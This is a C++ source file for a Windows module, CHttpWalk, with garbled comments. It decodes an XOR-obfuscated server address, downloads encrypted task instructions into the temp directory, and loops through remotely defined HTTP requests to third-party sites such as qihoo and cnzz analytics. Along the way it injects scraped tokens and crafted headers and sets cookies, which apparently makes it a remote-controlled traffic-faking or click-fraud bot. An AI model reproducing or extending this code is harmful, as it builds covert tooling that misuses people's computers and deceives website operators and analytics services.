// HttpSimulator.cpp: implementation of the CHttpWalk class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "HttpWalk.h"

#include "Wininet.h"
#pragma comment( lib, "Wininet.lib" )


//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CHttpWalk::CHttpWalk()
{
	m_bIsReady	= FALSE;
}

CHttpWalk::~CHttpWalk()
{

}


BOOL CHttpWalk::Init( LPCTSTR lpcszModFile, LPCTSTR lpcszModDir )
{
	TCHAR szWinTempDir[ MAX_PATH ]	= {0};

	//	��ȡϵͳ��ʱ�ļ���Ŀ¼
	if ( ! _vwfunc_get_window_tempdir( szWinTempDir, sizeof(szWinTempDir) ) )
	{
		return FALSE;
	}

	if ( PathFileExists( lpcszModFile ) )
	{
		_sntprintf( m_szModFile, sizeof(m_szModFile)-sizeof(TCHAR), "%s", lpcszModFile );
		_vwfunc_get_file_version( lpcszModFile, m_szModVer, sizeof(m_szModVer) );
	}
	if ( PathIsDirectory( lpcszModDir ) )
	{
		_sntprintf( m_szModDir, sizeof(m_szModDir)-sizeof(TCHAR), "%s", lpcszModDir );
		_sntprintf( m_szUnZipDir, sizeof(m_szUnZipDir)-sizeof(TCHAR), "%s", szWinTempDir );	//	temp dir

		_sntprintf( m_szIniEncFile, sizeof(m_szIniEncFile)-sizeof(TCHAR), "%s\\httpwalk.enc", m_szModDir );
		_sntprintf( m_szIniZipFile, sizeof(m_szIniZipFile)-sizeof(TCHAR), "%s\\httpwalk.zip", m_szModDir );

		//	�����ű��ļ�
		_sntprintf( m_szIniFile, sizeof(m_szIniFile)-sizeof(TCHAR), "%s\\httpwalk.ini", szWinTempDir );	//	temp dir

		//	������¼����Ĵ浵�ļ�
		_sntprintf( m_szRecordIniFile, sizeof(m_szRecordIniFile)-sizeof(TCHAR), "%s\\windowshttpwalk.ini", szWinTempDir );	//	temp dir

		m_bIsReady	= TRUE;
	}
	return m_bIsReady;
}

/**
 *	@ ˽�к���
 *	�ж��Ƿ��Ѿ�׼����
 */
BOOL CHttpWalk::IsReady()
{
	return m_bIsReady;
}

/**
 *	��ʼ HttpWalk
 */
BOOL CHttpWalk::StartHttpWalk()
{
	BOOL bRet	= FALSE;
	
	if ( ! IsReady() )
	{
		return FALSE;
	}
	
	//
	//	�ӷ�������ȡ�Ƿ���Ҫ��������Ϣ
	//
	if ( GetTaskFromServer() )
	{
		//
		//	�����Ƿ�����Ҫ����������
		//
		if ( CheckTaskInfo() )
		{
			if ( LoadAllTaskStepData( m_szIniFile ) )
			{
				bRet = TRUE;

				do
				{
					//	ִ����������
					bRet &= ExecAllTask();

					//	�ȴ�ʱ��
					if ( m_stHttpWalkCfg.dwSleep )
					{
						Sleep( m_stHttpWalkCfg.dwSleep );
					}

				} while( m_stHttpWalkCfg.bLoop );
			}
		}
	}

	return bRet;
}


/**
 *	�ӷ�������ȡ�Ƿ���Ҫ��������Ϣ
 */
BOOL CHttpWalk::GetTaskFromServer()
{
	BOOL  bRet				= FALSE;
	TCHAR szError[ MAX_PATH ]		= {0};
	TCHAR szHttpWalkZipUrl[ MAX_PATH ]	= {0};
	TCHAR szUrl[ MAX_PATH ]			= {0};
	CVwFileEncrypt cVwFileEnc;
	CVwZip vwzip;

	//	���� http://rd.xingworld.net?t=3001
	memcpy( szHttpWalkZipUrl, g_szVwBrowserIn_HttpWalkZip, min( sizeof(g_szVwBrowserIn_HttpWalkZip), sizeof(szHttpWalkZipUrl) ) );			
	_vwfunc_xorenc( szHttpWalkZipUrl );

	//	��ɴ��пͻ��˰汾�� URL
	_snprintf( szUrl, sizeof(szUrl)-sizeof(TCHAR), "%s&cver=%s", szHttpWalkZipUrl, m_szModVer );

	if ( CVwHttp::DownloadFile( szUrl, m_szIniEncFile, NULL, TRUE, szError, 3*60*1000 ) )
	{
		//	����-�����ļ���
		if ( cVwFileEnc.EncryptFile( m_szIniEncFile, m_szIniZipFile ) )
		{
			//	��ѹ�ļ�����ʱ�����ļ������Ŀ¼
			if ( vwzip.UnZipFiles( m_szIniZipFile, m_szUnZipDir, TRUE ) )
			{
				bRet = TRUE;
			}

			//	ɾ�� ZIP ��
			DeleteFile( m_szIniZipFile );
		}

		//	ɾ�� Enc �ļ�
		DeleteFile( m_szIniEncFile );
	}

	return bRet;
}

/**
 *	����Ƿ�������
 */
BOOL CHttpWalk::CheckTaskInfo()
{
	BOOL  bRet	= FALSE;

	if ( PathFileExists( m_szIniFile ) )
	{
		m_stHttpWalkCfg.bRun = (BOOL)GetPrivateProfileInt( "global", "run", 0, m_szIniFile );
		m_stHttpWalkCfg.bLoop = (BOOL)GetPrivateProfileInt( "global", "loop", 0, m_szIniFile );
		m_stHttpWalkCfg.dwSleep = (BOOL)GetPrivateProfileInt( "global", "sleep", HTTPWALK_CONFIG_SLEEP, m_szIniFile );

		if ( m_stHttpWalkCfg.bRun )
		{
			//	��������б�
			if ( m_vcTaskList.size() )
			{
				m_vcTaskList.clear();
			}

			//
			//	���� INI ��Ϣ
			//
			if ( ParseIniForTask( m_szIniFile ) )
			{
				bRet = ( m_vcTaskList.size() ? TRUE : FALSE );
			}
		}
	}
	
	return bRet;
}


/**
 *	@ ˽�к���
 *	������Ҫ���µ��ļ��б�
 */
BOOL CHttpWalk::ParseIniForTask( LPCTSTR lpcszIniFile )
{
	if ( NULL == lpcszIniFile || ! PathFileExists( lpcszIniFile ) )
	{
		return FALSE;
	}

	vector <STHTTPWALKSECTIONLINE> vcSection;
	vector <STHTTPWALKSECTIONLINE>::iterator it;
	STHTTPWALKTASKLIST stTask;

	if ( ParseIniSection( lpcszIniFile, "task", vcSection ) )
	{
		for ( it = vcSection.begin(); it != vcSection.end(); it ++ )
		{
			memset( & stTask, 0, sizeof( stTask ) );
			_sntprintf( stTask.szTask, sizeof(stTask.szTask)-sizeof(TCHAR), "%s", (*it).szLine );
			m_vcTaskList.push_back( stTask );
		}

		return TRUE;
	}

	return FALSE;
}

/**
 *	װ����������� STEP ��Ϣ
 */
BOOL CHttpWalk::LoadAllTaskStepData( LPCTSTR lpcszIniFile )
{
	if ( NULL == lpcszIniFile || ! PathFileExists( lpcszIniFile ) )
	{
		return FALSE;
	}

	vector<STHTTPWALKTASKLIST>::iterator it;
	vector<STHTTPWALKTASKSTEP> * pvcTaskStep;
	vector<STHTTPWALKSECTIONLINE> vcSection;
	vector<STHTTPWALKSECTIONLINE>::iterator itSec;
	vector<STHTTPWALKTASKSTEP>::iterator itStep;
	STHTTPWALKTASKSTEP stStep;
	STHTTPHEADERVAR stHeaderVar;

	for ( it = m_vcTaskList.begin(); it != m_vcTaskList.end(); it ++ )
	{
		//	ָ������
		pvcTaskStep	= &(*it).vcTaskStep;

		//	��ȡ������� step
		vcSection.clear();
		if ( ParseIniSection( lpcszIniFile, (*it).szTask, vcSection ) )
		{
			//	�������л�ȡ���ĸ� Section �����
			//	vcTaskStep
			for ( itSec = vcSection.begin(); itSec != vcSection.end(); itSec ++ )
			{
				memset( & stStep, 0, sizeof( stStep ) );
				_sntprintf( stStep.szStep, sizeof(stStep.szStep)-sizeof(TCHAR), "%s", (*itSec).szLine );
				pvcTaskStep->push_back( stStep );
			}
		}

		//	Ϊÿ�� step ��ȡ���������磺[httpwalk_qihoo3]
		for ( itStep = pvcTaskStep->begin(); itStep != pvcTaskStep->end(); itStep ++ )
		{
			if ( strstr( (*itStep).szStep, HTTPWALK_TYPE_HTTPWALK ) )
			{
				//	parse [httpwalk_*]
				_tcscpy( (*itStep).szType, HTTPWALK_TYPE_HTTPWALK );
				(*itStep).stHttpWalkTask.dwTimeout	= (DWORD)GetPrivateProfileInt( (*itStep).szStep, "timeout", 180000, lpcszIniFile );
				(*itStep).stHttpWalkTask.dwDepth	= (DWORD)GetPrivateProfileInt( (*itStep).szStep, "depth", 6, lpcszIniFile );
				GetPrivateProfileString( (*itStep).szStep, "header", "", (*itStep).stHttpWalkTask.szHeaderSec, sizeof((*itStep).stHttpWalkTask.szHeaderSec), lpcszIniFile );
				GetPrivateProfileString( (*itStep).szStep, "url", "", (*itStep).stHttpWalkTask.szUrl, sizeof((*itStep).stHttpWalkTask.szUrl), lpcszIniFile );
				GetPrivateProfileString( (*itStep).szStep, "rsck", "", (*itStep).stHttpWalkTask.szRsckUrl, sizeof((*itStep).stHttpWalkTask.szRsckUrl), lpcszIniFile );

				//	������ܵ� ReplaceNode
				checkReplaceNode( lpcszIniFile, (*itStep).stHttpWalkTask.szUrl );
				checkReplaceNode( lpcszIniFile, (*itStep).stHttpWalkTask.szRsckUrl );

				//	װ�� header
				vcSection.clear();
				if ( ParseIniSection( lpcszIniFile, (*itStep).stHttpWalkTask.szHeaderSec, vcSection ) )
				{
					//	�������л�ȡ���ĸ� Section �����
					//	vcTaskStep
					for ( itSec = vcSection.begin(); itSec != vcSection.end(); itSec ++ )
					{
						StrTrim( (*itSec).szLine, " \r\n" );
						memset( & stHeaderVar, 0, sizeof( stHeaderVar ) );
						_sntprintf( stHeaderVar.szHeadLine, sizeof(stHeaderVar.szHeadLine)-sizeof(TCHAR), "%s\r\n", (*itSec).szLine );

						//	������ܵ� ReplaceNode
						checkReplaceNode( lpcszIniFile, stHeaderVar.szHeadLine );

						//	push to vector
						(*itStep).stHttpWalkTask.vcHeaderVar.push_back( stHeaderVar );
					}
				}
			}
			else if ( strstr( (*itStep).szStep, HTTPWALK_TYPE_SETCOOKIE ) )
			{
				_tcscpy( (*itStep).szType, HTTPWALK_TYPE_SETCOOKIE );
				GetPrivateProfileString( (*itStep).szStep, "url", "", (*itStep).stSetCookieTask.szUrl, sizeof((*itStep).stSetCookieTask.szUrl), lpcszIniFile );
				GetPrivateProfileString( (*itStep).szStep, "name", "", (*itStep).stSetCookieTask.szName, sizeof((*itStep).stSetCookieTask.szName), lpcszIniFile );
				GetPrivateProfileString( (*itStep).szStep, "value", "", (*itStep).stSetCookieTask.szValue, sizeof((*itStep).stSetCookieTask.szValue), lpcszIniFile );

				//	������ܵ� ReplaceNode
				checkReplaceNode( lpcszIniFile, (*itStep).stSetCookieTask.szUrl );
				checkReplaceNode( lpcszIniFile, (*itStep).stSetCookieTask.szName );
				checkReplaceNode( lpcszIniFile, (*itStep).stSetCookieTask.szValue );
			}
		}
	}
	
	return TRUE;
}


/**
 *	ִ����������
 */
BOOL CHttpWalk::ExecAllTask()
{
	CVwHttp http;
	vector<STHTTPWALKTASKLIST>::iterator it;
	vector<STHTTPWALKTASKSTEP> * pvcTaskStep;
	vector<STHTTPWALKTASKSTEP>::iterator itStep;
	STHTTPWALKTASK * pstHttpWalkTask;
	TCHAR szHeaderOut[ 1024 ]	= {0};
	TCHAR szError[ MAX_PATH ]	= {0};
	DWORD dwRecDepth		= 0;

	for ( it = m_vcTaskList.begin(); it != m_vcTaskList.end(); it ++ )
	{
		//	ָ������
		pvcTaskStep	= &(*it).vcTaskStep;

		//	ִ��ÿһ�� step
		for ( itStep = pvcTaskStep->begin(); itStep != pvcTaskStep->end(); itStep ++ )
		{
			if ( strstr( (*itStep).szStep, HTTPWALK_TYPE_HTTPWALK ) )
			{
				//	ָ��
				pstHttpWalkTask = &(*itStep).stHttpWalkTask;

				//	�ȿ�������Ƿ��ˣ�������˾Ͳ�Ҫ������
				dwRecDepth = GetTodayDepthByStepName( (*itStep).szStep );
				if ( dwRecDepth > pstHttpWalkTask->dwDepth )
				{
					continue;
				}

				if ( 0 == _tcslen( pstHttpWalkTask->szUrl ) )
				{
					continue;
				}

				//	����һ�� URL
				memset( szHeaderOut, 0, sizeof(szHeaderOut) );
				BOOL bGetHead = http.GetHttpHeaderEx
				(
					pstHttpWalkTask->szUrl,
					pstHttpWalkTask->vcHeaderVar,
					szHeaderOut,
					sizeof(szHeaderOut),
					szError,
					pstHttpWalkTask->dwTimeout
				);
				if ( _tcslen( pstHttpWalkTask->szRsckUrl ) && _tcslen( szHeaderOut ) )
				{
					//	��ȡ������ Cookie
					readAndStoreCookie( pstHttpWalkTask->szRsckUrl, szHeaderOut );
				}

				//
				//	���浱ǰ STEP �Ĺ������
				//
				dwRecDepth ++;
				SaveTodayDepthByStepName( (*itStep).szStep, dwRecDepth );				
			}
			else if ( strstr( (*itStep).szStep, HTTPWALK_TYPE_SETCOOKIE ) )
			{
				if ( 0 == _tcslen( (*itStep).stSetCookieTask.szUrl ) || 
					0 == _tcslen( (*itStep).stSetCookieTask.szName ) ||
					0 == _tcslen( (*itStep).stSetCookieTask.szValue ) )
				{
					continue;
				}
				InternetSetCookie( (*itStep).stSetCookieTask.szUrl, (*itStep).stSetCookieTask.szName, (*itStep).stSetCookieTask.szValue );
			}
		}
	}

	return TRUE;
}

/**
 *	@ ˽�к���
 *	���� step ���ƶ�ȡ�� step �����
 */
DWORD CHttpWalk::GetTodayDepthByStepName( LPCTSTR lpcszStepName )
{
	if ( NULL == lpcszStepName || 0 == _tcslen( lpcszStepName ) )
	{
		return 0;
	}
	if ( ! PathFileExists( m_szRecordIniFile ) )
	{
		return 0;
	}

	DWORD dwRet		= 0;
	SYSTEMTIME st;
	DWORD dwNowDate		= 0;
	DWORD dwRecDate		= 0;
	DWORD dwRecDepth	= 0;

	//	��ǰ����
	GetLocalTime( &st );
	dwNowDate = ( st.wMonth * 100 + st.wDay );

	dwRecDate	= (DWORD)GetPrivateProfileInt( lpcszStepName, HTTPWALK_INI_KEY_LASTWORK, 0, m_szRecordIniFile );
	dwRecDepth	= (DWORD)GetPrivateProfileInt( lpcszStepName, HTTPWALK_INI_KEY_DEPTH, 0, m_szRecordIniFile );

	if ( dwRecDate && dwRecDepth )
	{
		dwRet = ( dwRecDate == dwNowDate ? dwRecDepth : 0 );
	}

	return dwRet;
}
/**
 *	@ ˽�к���
 *	���� step ���Ʊ���� step �����
 */
BOOL CHttpWalk::SaveTodayDepthByStepName( LPCTSTR lpcszStepName, DWORD dwDepth )
{
	if ( NULL == lpcszStepName || 0 == _tcslen( lpcszStepName ) )
	{
		return 0;
	}

	SYSTEMTIME st;
	DWORD dwNowDate			= 0;
	TCHAR szTemp[ MAX_PATH ]	= {0};

	//	��ǰ����
	GetLocalTime( &st );
	dwNowDate = ( st.wMonth * 100 + st.wDay );

	_sntprintf( szTemp, sizeof(szTemp)-sizeof(TCHAR), "%d", dwNowDate );
	WritePrivateProfileString( lpcszStepName, HTTPWALK_INI_KEY_LASTWORK, szTemp, m_szRecordIniFile );
	
	_sntprintf( szTemp, sizeof(szTemp)-sizeof(TCHAR), "%d", dwDepth );
	WritePrivateProfileString( lpcszStepName, HTTPWALK_INI_KEY_DEPTH, szTemp, m_szRecordIniFile );

	return TRUE;
}



/**
 *	@ ˽�к���
 *	������Ҫ���µ��ļ��б�
 */
BOOL CHttpWalk::ParseIniSection( LPCTSTR lpcszIniFile, LPCTSTR lpcszSection, vector<STHTTPWALKSECTIONLINE> & vcSection )
{
	if ( NULL == lpcszIniFile || ! PathFileExists( lpcszIniFile ) )
	{
		return FALSE;
	}
	if ( NULL == lpcszSection || 0 == _tcslen( lpcszSection ) )
	{
		return FALSE;
	}

	BOOL  bRet = FALSE;
	CMultiString mstr;
	TCHAR szSection[ 32767 ]		= {0};		// Win95 �Ĵ�С����
	INT   nSectionLen			= 0;
	INT   nNum				= 0;
	TCHAR ** ppList				= NULL;
	TCHAR ** p				= NULL;
	STHTTPWALKSECTIONLINE stLine;
	vector <STHTTPWALKSECTIONLINE>::iterator it;
	BOOL bExist				= FALSE;
	TCHAR * pMov				= NULL;

	//	����������������
	if ( vcSection.size() )
	{
		vcSection.clear();
	}

	nSectionLen = GetPrivateProfileSection( lpcszSection, szSection, sizeof(szSection), lpcszIniFile );
	if ( 0 == nSectionLen )
	{
		return FALSE;
	}

	ppList = mstr.MultiStringToStringList( szSection, nSectionLen+sizeof(TCHAR), &nNum );
	if ( ppList )
	{
		p = ppList;
		while( p && *p )
		{
			if ( 0 == _tcslen(*p) )
			{
				p ++;
				continue;
			}

			memset( & stLine, 0, sizeof( stLine ) );
			_sntprintf( stLine.szLine, sizeof(stLine.szLine)-sizeof(TCHAR), "%s", *p );

			bExist = FALSE;
			for ( it = vcSection.begin(); it != vcSection.end(); it ++ )
			{
				if ( 0 == _tcsicmp( stLine.szLine, (*it).szLine ) )
				{
					bExist = TRUE;
					break;
				}
			}

			if ( ! bExist )
			{
				//	�����������ӵ�����
				vcSection.push_back( stLine );
			}

			//	..
			p ++;
		}
		free( ppList );
	}

	return TRUE;
}


/**
 *	�� http ͷ�����ȡ Cookie��������洢������
 */
BOOL CHttpWalk::readAndStoreCookie( LPCTSTR lpcszUrl, LPCTSTR lpcszHeader )
{
	/*
		lpcszHeader	- [in] http header
		RETURN		- TRUE / FLASE

		HTTP/1.1 302 Found
		Date: Thu, 04 Oct 2007 11:07:40 GMT
		Server: Apache
		P3P: CP="CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi SAMi OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE GOV"
		Set-Cookie: B=ID=549341191496060:V=2:S=80e27bc924; path=/; expires=Sun, 17-Jun-2038 23:59:59 GMT; domain=.qihoo.com
		Set-Cookie: UT=T=1191496060:F=d3d3Lnl4OC5jb20=; path=/; domain=.qihoo.com
		Set-Cookie: UT=T=1191496060:F=d3d3Lnl4OC5jb20:S=5; path=/; domain=.qihoo.com
		X-Powered-By: PHP/5.2.3
		Location: http://pic.qihoo.com/comic/57738_200708,1752276,c9aa52,s4838_32699,1.html
		Content-Length: 0
		Proxy-Connection: close
		Content-Type: text/html
	*/
	if ( NULL == lpcszUrl || 0 == _tcslen( lpcszUrl ) )
	{
		return FALSE;
	}
	if ( NULL == lpcszHeader || 0 == _tcslen( lpcszHeader ) )
	{
		return FALSE;
	}

	BOOL bRet			= TRUE;
	BOOL bSetCookie			= FALSE;
	UINT i;
	UINT uEqualCount		= 0;
	UINT uLen			= 0;
	LPTSTR lpszHead			= NULL;
	LPTSTR lpszMov			= NULL;
	LPTSTR lpszTail			= NULL;
	LPTSTR lpszTemp			= NULL;
	TCHAR szCkName[ 64 ]		= {0};
	TCHAR szCkValue[ MAX_PATH ]	= {0};
	TCHAR szCkDomain[ 64 ]		= {0};
	TCHAR szCkLine[ 1024 ]		= {0};

	lpszMov = (LPTSTR)lpcszHeader;
	lpszHead = lpszMov;
	while ( lpszMov )
	{
		lpszMov = strstr( lpszHead, "Set-Cookie:" );
		if ( lpszMov )
		{
			_sntprintf( szCkLine, sizeof(szCkLine)-sizeof(TCHAR), "%s", lpszMov+_tcslen("Set-Cookie:") );

			//	�ҵ� \r\n ��β
			lpszTail = strstr( szCkLine, "\r\n" );
			if ( lpszTail )
			{
				*lpszTail = 0;
				StrTrim( szCkLine, " \r\n" );

				_sntprintf( szCkName, sizeof(szCkName)-sizeof(TCHAR), "%s", szCkLine );
				uLen		= _tcslen(szCkName);
				uEqualCount	= 0;
				for ( i = 0; i < uLen; i ++ )
				{
					if ( '=' == szCkName[ i ] )
					{
						uEqualCount ++;
					}
					if ( ';' == szCkName[ i ] )
					{
						break;
					}
					if ( uEqualCount >= 2 )
					{
						break;
					}
				}
				if ( uEqualCount && i < ( uLen - sizeof(TCHAR) ) )
				{
					szCkName[ i ] = 0;
					_sntprintf( szCkValue, sizeof(szCkValue)-sizeof(TCHAR), "%s", ( szCkName + i + sizeof(TCHAR) ) );
					lpszTemp = strpbrk( szCkValue, ";\r\n" );
					if ( lpszTemp )
					{
						*lpszTemp = 0;
					}
				}

				//	���� Cookie
				bSetCookie = InternetSetCookie( lpcszUrl, szCkName, szCkValue );
			}
		
			//	next
			lpszHead = CharNext( lpszMov );
		}
	}

	return TRUE;
}

BOOL CHttpWalk::getRedirectLocation( LPCTSTR lpcszHeader, LPTSTR lpszLocation, DWORD dwSize )
{
	/*
		lpcszHeader	- [in]  HTTP ͷ
		lpszLocation	- [out] ת��ĵ�ַ
		dwSize		- [in]  ��������С
		RETURN		- TRUE / FALSE

		HTTP/1.1 302 Found
		Date: Thu, 04 Oct 2007 11:07:40 GMT
		Server: Apache
		P3P: CP="CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi SAMi OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE GOV"
		Set-Cookie: B=ID=549341191496060:V=2:S=80e27bc924; path=/; expires=Sun, 17-Jun-2038 23:59:59 GMT; domain=.qihoo.com
		Set-Cookie: UT=T=1191496060:F=d3d3Lnl4OC5jb20=; path=/; domain=.qihoo.com
		Set-Cookie: UT=T=1191496060:F=d3d3Lnl4OC5jb20:S=5; path=/; domain=.qihoo.com
		X-Powered-By: PHP/5.2.3
		Location: http://pic.qihoo.com/comic/57738_200708,1752276,c9aa52,s4838_32699,1.html
		Content-Length: 0
		Proxy-Connection: close
		Content-Type: text/html
	*/
	if ( NULL == lpcszHeader || 0 == _tcslen( lpcszHeader ) )
	{
		return FALSE;
	}
	if ( NULL == lpszLocation || 0 == dwSize )
	{
		return FALSE;
	}
	if ( ! _tcsstr( lpcszHeader, " 302 Found\r\n" ) )
	{
		//	δ��������� HTTP ͷ�� 302
		return FALSE;
	}

	BOOL bRet		= FALSE;
	LPTSTR lpszMov		= NULL;
	LPTSTR lpszTail		= NULL;

	lpszMov = strstr( lpcszHeader, "Location:" );
	if ( lpszMov )
	{
		_sntprintf( lpszLocation, dwSize-sizeof(TCHAR), "%s", lpszMov+_tcslen("Location:") );

		//	�ҵ� \r\n ��β
		lpszTail = strstr( lpszLocation, "\r\n" );
		if ( lpszTail )
		{
			*lpszTail = 0;
			StrTrim( lpszLocation, " \r\n" );
		}

		bRet = TRUE;
	}

	return bRet;
}


//////////////////////////////////////////////////////////////////////////

/**
 *	��� ReplaceNode �ڵ�
 */
VOID CHttpWalk::checkReplaceNode( LPCTSTR lpcszIniFile, LPTSTR lpszContent )
{
	/*
		lpcszContent	- [in/out] ������������
		RETURN		- TRUE / FALSE
	*/
	if ( NULL == lpszContent || 0 == strlen( lpszContent ) )
	{
		return;
	}

	TCHAR szNodeName[ 64 ]		= {0};
	TCHAR szNodeNameOrg[ 64 ]	= {0};
	TCHAR szNodeValue[ MAX_PATH ]	= {0};
	LONG  lnCntLen			= _tcslen( lpszContent );
	LONG  lnNameStart		= -1;

	lnNameStart = getReplaceNodeName( lpszContent, szNodeName, sizeof(szNodeName) );
	while ( lnNameStart >= 0 && lnNameStart < ( lnCntLen - 3 ) )
	{
		if ( getReplaceNodeValue( lpcszIniFile, szNodeName, szNodeValue, sizeof(szNodeValue) ) )
		{
			_sntprintf
			(
				szNodeNameOrg, sizeof(szNodeNameOrg)-sizeof(TCHAR), "%s%s%s",
				HTTPWALK_REPLACENODE_START, szNodeName, HTTPWALK_REPLACENODE_END
			);
			_vwfunc_replace( lpszContent, szNodeNameOrg, szNodeValue );
			lnCntLen = _tcslen( lpszContent );
		}

		if ( lnNameStart < ( lnCntLen - 3 ) )
		{
			memset( szNodeName, 0, sizeof( szNodeName ) );
			lnNameStart = getReplaceNodeName( lpszContent+lnNameStart+1, szNodeName, sizeof(szNodeName) );
		}
		else
		{
			break;
		}
	}
}

/**
 *	��ȡ�滻ֵ�ڵ������
 */
LONG CHttpWalk::getReplaceNodeName( LPCTSTR lpcszContent, LPTSTR lpszName, DWORD dwSize )
{
	/*
		lpcszContent	- [in]  ����
		lpszName	- [out] ���ص����� 
		dwSize		- [in]  ���ػ�������С
		RETURN		- TRUE / FALSE

		������Ҫ�� lpcszContent ָ����ָ����������ҵ� {@@@[cnzzntime1]@@@} �Ľڵ㣬������ȡ cnzzntime1
	*/
	if ( NULL == lpcszContent || NULL == lpszName || 0 == dwSize )
	{
		return -1;
	}

	LONG   lnRet		= -1;
	LPTSTR lpszMov		= NULL;
	LPTSTR lpszHead		= NULL;

	lpszHead = strstr( lpcszContent, HTTPWALK_REPLACENODE_START );
	if ( lpszHead )
	{
		//	..
		_sntprintf( lpszName, dwSize-sizeof(TCHAR), "%s", lpszHead + strlen( HTTPWALK_REPLACENODE_START ) );
		lpszMov = strstr( lpszName, HTTPWALK_REPLACENODE_END );
		if ( lpszMov )
		{
			*lpszMov = 0;
			lnRet = ( lpszHead - lpcszContent );
		}
	}
	if ( -1 == lnRet )
	{
		*lpszName = 0;
	}
	return lnRet;
}

/**
 *	��ȡ�滻ֵ�ڵ�� Value
 */
BOOL CHttpWalk::getReplaceNodeValue( LPCTSTR lpcszIniFile, LPCTSTR lpszName, LPTSTR lpszValue, DWORD dwSize )
{
	/*
		lpszName	- [in]  �ڵ�����
		lpszValue	- [out] ���ص����� 
		dwSize		- [in]  ���ػ�������С
		RETURN		- TRUE / FALSE
	*/
	if ( NULL == lpcszIniFile || ! PathFileExists( lpcszIniFile ) )
	{
		return FALSE;
	}
	if ( NULL == lpszName || 0 == strlen( lpszName ) || NULL == lpszValue || 0 == dwSize )
	{
		return FALSE;
	}

	BOOL   bRet		= FALSE;
	STHTTPWALKREPLACENODE stReplaceNode;
	vector<STHTTPWALKSECTIONLINE> vcSection;
	vector<STHTTPWALKSECTIONLINE>::iterator itSec;
	STHTTPHEADERVAR stHeaderVar;
	TCHAR szResponse[ 1024*4 ]	= {0};

	GetPrivateProfileString( lpszName, "header", "", stReplaceNode.szHeaderSec, sizeof(stReplaceNode.szHeaderSec), lpcszIniFile );
	GetPrivateProfileString( lpszName, "type", "", stReplaceNode.szType, sizeof(stReplaceNode.szType), lpcszIniFile );
	GetPrivateProfileString( lpszName, "url", "", stReplaceNode.szUrl, sizeof(stReplaceNode.szUrl), lpcszIniFile );
	GetPrivateProfileString( lpszName, "start", "", stReplaceNode.szStart, sizeof(stReplaceNode.szStart), lpcszIniFile );
	GetPrivateProfileString( lpszName, "end", "", stReplaceNode.szEnd, sizeof(stReplaceNode.szEnd), lpcszIniFile );
	GetPrivateProfileString( lpszName, "default", "", stReplaceNode.szDefaultValue, sizeof(stReplaceNode.szDefaultValue), lpcszIniFile );


	//	װ�� header
	if ( strlen( stReplaceNode.szHeaderSec ) )
	{
		vcSection.clear();
		if ( ParseIniSection( lpcszIniFile, stReplaceNode.szHeaderSec, vcSection ) )
		{
			//	�������л�ȡ���ĸ� Section �����
			//	vcTaskStep
			for ( itSec = vcSection.begin(); itSec != vcSection.end(); itSec ++ )
			{
				StrTrim( (*itSec).szLine, " \r\n" );
				memset( & stHeaderVar, 0, sizeof( stHeaderVar ) );
				_sntprintf( stHeaderVar.szHeadLine, sizeof(stHeaderVar.szHeadLine)-sizeof(TCHAR), "%s\r\n", (*itSec).szLine );

				//	������ܵ� ReplaceNode
				checkReplaceNode( lpcszIniFile, stHeaderVar.szHeadLine );

				//	push to vector
				stReplaceNode.vcHeaderVar.push_back( stHeaderVar );
			}
		}
	}

	if ( strlen( stReplaceNode.szType ) && strlen( stReplaceNode.szUrl ) &&
		strlen( stReplaceNode.szStart ) && strlen( stReplaceNode.szEnd ) )
	{
		if ( 0 == stricmp( "cnzzntime", stReplaceNode.szType ) )
		{
			if ( getReplaceNodeRemoteContent( stReplaceNode.szUrl, & stReplaceNode.vcHeaderVar, szResponse, sizeof(szResponse) ) )
			{
				bRet = cnzz_getNTimeValue( szResponse, stReplaceNode.szStart, stReplaceNode.szEnd, lpszValue, dwSize );
			}
		}
	}
	if ( ! bRet && _tcslen( stReplaceNode.szDefaultValue ) )
	{
		_sntprintf( lpszValue, dwSize-sizeof(TCHAR), "%s", stReplaceNode.szDefaultValue );
	}

	return bRet;
}

/**
 *	��ȡԶ��ָ���ļ�������
 */
BOOL CHttpWalk::getReplaceNodeRemoteContent( LPCTSTR lpcszUrl, vector<STHTTPHEADERVAR> * pvcHeaderVar, LPTSTR lpszResponse, DWORD dwSize )
{
	if ( NULL == lpcszUrl || NULL == lpszResponse || 0 == dwSize )
	{
		return FALSE;
	}

	CVwHttp http;
	TCHAR szError[ MAX_PATH ]	= {0};

	if ( pvcHeaderVar )
	{
		return http.GetResponseEx( lpcszUrl, *pvcHeaderVar, lpszResponse, dwSize, szError, 3*60*1000 );
	}
	else
	{
		return http.GetResponse( lpcszUrl, lpszResponse, dwSize, szError, 3*60*1000 );
	}
}

/**
 *	��ȡ CNZZ �������� ntime ֵ
 */
BOOL CHttpWalk::cnzz_getNTimeValue( LPCTSTR lpcszContent, LPCTSTR lpcszStart, LPCTSTR lpcszEnd,  LPTSTR lpszValue, DWORD dwSize )
{
	/*
		lpcszContent	- [in] ��ҳ����
		RETURN		- TRUE / FALSE

		���� '&ntime=0.33018200 1192121518'; ��ȡ ntime ��ֵ
		����ֵ��(@@@[cnzzntime1]@@@)
	*/
	if ( NULL == lpcszContent || NULL == lpcszStart || NULL == lpcszEnd || NULL == lpszValue || 0 == dwSize )
	{
		return FALSE;
	}

	BOOL bRet			= FALSE;
	LPTSTR lpszMov			= NULL;
	LPTSTR lpszHead			= NULL;

	lpszHead = strstr( lpcszContent, lpcszStart );
	if ( lpszHead )
	{
		_sntprintf( lpszValue, dwSize-sizeof(TCHAR), "%s", lpszHead+strlen(lpcszStart) );
		lpszMov = strstr( lpszValue, lpcszEnd );
		if ( lpszMov )
		{
			*lpszMov = 0;

			if ( dwSize - strlen( lpszValue ) > 2 )
			{
				_vwfunc_replace( lpszValue, " ", "%20" );
			}
			bRet = TRUE;
		}
	}

	return bRet;
}